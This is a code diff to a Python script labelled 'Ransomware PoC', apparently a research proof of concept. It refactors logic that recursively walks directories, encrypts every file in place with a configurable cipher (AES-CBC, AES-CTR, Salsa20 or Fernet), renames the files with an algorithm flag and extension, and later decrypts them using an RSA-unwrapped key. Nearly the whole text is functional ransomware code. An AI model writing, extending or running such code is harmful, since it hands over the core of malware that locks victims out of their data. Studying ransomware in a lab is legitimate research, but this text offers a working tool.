@@ -135,66 +135,78 @@ def modify_file_inplace(file_name, crypto, block_size=16):
             plaintext = f.read(block_size)
 
 
-def encrypt_files(crypt, start_dirs):  # TODO: include within function to dynamically switch crypt on config change
-    # Recursively go through folders and encrypt files
-    for curr_dir in start_dirs:
-        for file in discover_files(curr_dir):
-            # TODO: implement encryption bursts based on current config, consider config change
-            if not file.endswith(EXTENSION):
-                modify_file_inplace(file, crypt.encrypt)
-                os.rename(file, file + EXTENSION)
-                print("File changed from " + file + " to " + file + EXTENSION)
-
-
-def decrypt_files(crypt, start_dirs):
-    # Recursively go through folders and decrypt files
-    for curr_dir in start_dirs:
-        for file in discover_files(curr_dir):
-            if file.endswith(EXTENSION):
-                # do not use double encrypt for decrypt (might work with this setup, but not guaranteed)
-                modify_file_inplace(file, crypt.decrypt)
-                file_original = os.path.splitext(file)[0]
-                os.rename(file, file_original)
-                print("File changed from " + file + " to " + file_original)
-
-
 def select_encryption_algorithm(key):
     config = get_config_from_file()
     match config["ALGORITHM"]["algo"]:
         case "AES-CBC":
             assert len(key) in [16, 24, 32]
-            return AES.new(key=key, mode=AES.MODE_CBC)
+            return AES.new(key=key, mode=AES.MODE_CBC), ".0"
         case "AES-CTR":
             assert len(key) in [16, 24, 32]
             ctr = Counter.new(128)
-            return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr)
+            return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr), ".1"
         case "Salsa20":
             assert len(key) == 32
-            return Salsa20.new(key=key)
+            return Salsa20.new(key=key), ".2"
         case "Fernet":
+            assert len(key) == 32
+            return Fernet(key=key), ".3"
+        case _:
+            assert len(key) in [16, 24, 32]
+            print("unknown encryption algorithm config used. Falling back to default AES-CTR encryption")
+            ctr = Counter.new(128)
+            return AES.new(key, AES.MODE_CTR, counter=ctr), ".1"
+
+
+def select_decryption_algorithm(filename, key):
+    flag = os.path.basename(filename).split(".")[-2]
+    match flag:
+        case "0":
+            assert len(key) in [16, 24, 32]
+            return AES.new(key=key, mode=AES.MODE_CBC)
+        case "1":
+            assert len(key) in [16, 24, 32]
+            ctr = Counter.new(128)
+            return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr)
+        case "2":
+            assert len(key) == 32
+            return Salsa20.new(key=key)
+        case "3":
             assert len(key) == 32
             return Fernet(key=key)
         case _:
             assert len(key) in [16, 24, 32]
-            print("unknown encryption algorithm config used. Falling back to default AES-CTR")
+            print("unknown encryption algorithm config was used. Falling back to default AES-CTR decryption")
             ctr = Counter.new(128)
             return AES.new(key, AES.MODE_CTR, counter=ctr)
 
 
-def parse_args():
-    parser = argparse.ArgumentParser(description='Ransomware PoC')
-    parser.add_argument('-p', '--path',
-                        help='Comma-separated (no-whitespace) list of absolute paths to start encryption. '
-                             + 'If none specified, defaults to %%HOME%%/test_ransomware',
-                        action="store")
+def encrypt_files(key, start_dirs):
+    # Recursively go through folders and encrypt files
+    for curr_dir in start_dirs:
+        for file in discover_files(curr_dir):
+            # TODO: implement encryption bursts based on current config, consider config change
+            if not file.endswith(EXTENSION):
+                crypt, flag = select_encryption_algorithm(key)
+                modify_file_inplace(file, crypt.encrypt)
+                encrypted_name = file + flag + EXTENSION
+                os.rename(file, encrypted_name)
+                print("File changed from " + file + " to " + encrypted_name)
 
-    group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
-                       action='store_true')
-    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
-                       action='store_true')
 
-    return parser.parse_args()
+def decrypt_files(key, start_dirs):
+    # Recursively go through folders and decrypt files
+    for curr_dir in start_dirs:
+        for file in discover_files(curr_dir):
+            if file.endswith(EXTENSION):
+                # do not use double encrypt for decrypt (might work with this setup, but not guaranteed)
+                crypt = select_decryption_algorithm(file, key)
+                modify_file_inplace(file, crypt.decrypt)
+
+                abs_dir = os.path.dirname(file)
+                file_original = ".".join(os.path.basename(file).split(".")[:-2])
+                os.rename(file, os.path.join(abs_dir, file_original))
+                print("File changed from " + file + " to " + file_original)
 
 
 def run(absolute_paths, encrypt):
@@ -227,12 +239,26 @@ def run(absolute_paths, encrypt):
         decryptor = PKCS1_OAEP.new(rsa_key)
         key = decryptor.decrypt(base64.b64decode(encrypted_key_b64))
 
-    crypt = select_encryption_algorithm(key)
-
     if encrypt:
-        encrypt_files(crypt, start_dirs)
+        encrypt_files(key, start_dirs)
     else:
-        decrypt_files(crypt, start_dirs)
+        decrypt_files(key, start_dirs)
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description='Ransomware PoC')
+    parser.add_argument('-p', '--path',
+                        help='Comma-separated (no-whitespace) list of absolute paths to start encryption. '
+                             + 'If none specified, defaults to %%HOME%%/test_ransomware',
+                        action="store")
+
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
+                       action='store_true')
+    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
+                       action='store_true')
+
+    return parser.parse_args()
 
 
 def main():
